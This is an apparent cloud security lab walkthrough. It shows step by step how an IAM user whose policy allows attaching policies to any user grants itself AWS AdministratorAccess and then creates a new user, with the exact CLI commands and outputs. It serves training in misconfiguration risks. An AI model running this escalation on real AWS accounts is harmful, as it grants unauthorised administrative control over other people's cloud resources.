# Overly permissive permission I

Overly Permissive Permission can be abused by a user to perform privileged operations.

Objective: Leverage the policy attached to the student user and attain administrative privileges on the AWS account.

----

1. Get access to AWS lab credentials.
2. Configure AWS CLI.
3. Check identity with:

```text
aws sts get-caller-identity
```

4. List the policies attached to the `student` user:

```text
aws iam list-attached-user-policies --user-name student
```

5. Check policy details for the Service policy:

```text
aws iam get-policy --policy-arn arn:aws:iam::862839114976:policy/Service
```

6. View policy details for the v1 version of Service policy:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::862839114976:policy/Service --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "iam:AttachUserPolicy",
                    "Effect": "Allow",
                    "Resource": "arn:aws:iam::*:user/*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2023-05-11T09:02:39+00:00"
    }
}
```

7. Try creating a new user, named bob:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam create-user --user-name Bob
```

FAIL.

8. Get `AdministratorAccess` policy `arn`:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-policies | grep 'AdministratorAccess'
            "PolicyName": "AdministratorAccess",
            "Arn": "arn:aws:iam::aws:policy/AdministratorAccess",
            "PolicyName": "AdministratorAccess-Amplify",
            "Arn": "arn:aws:iam::aws:policy/AdministratorAccess-Amplify",
            "PolicyName": "AWSAuditManagerAdministratorAccess",
            "Arn": "arn:aws:iam::aws:policy/AWSAuditManagerAdministratorAccess",
            "PolicyName": "AdministratorAccess-AWSElasticBeanstalk",
            "Arn": "arn:aws:iam::aws:policy/AdministratorAccess-AWSElasticBeanstalk",
```

9. Attach administrator policy to the current user:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam attach-user-policy --user-name student --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

10. Check with:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam list-attached-user-policies --user-name student
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        },
        {
            "PolicyName": "IAMReadOnlyAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMReadOnlyAccess"
        },
        {
            "PolicyName": "Service",
            "PolicyArn": "arn:aws:iam::862839114976:policy/Service"
        }
    ]
}
```

11. Try creating a new user named Bob again:

```text
┌──(kali㉿kali)-[~]
└─$ aws iam create-user --user-name Bob
{
    "User": {
        "Path": "/",
        "UserName": "Bob",
        "UserId": "AIDA4RZJYBTQHLY5KDFRX",
        "Arn": "arn:aws:iam::862839114976:user/Bob",
        "CreateDate": "2023-05-11T09:11:37+00:00"
    }
}
```

Successfully performed a privileged operation.
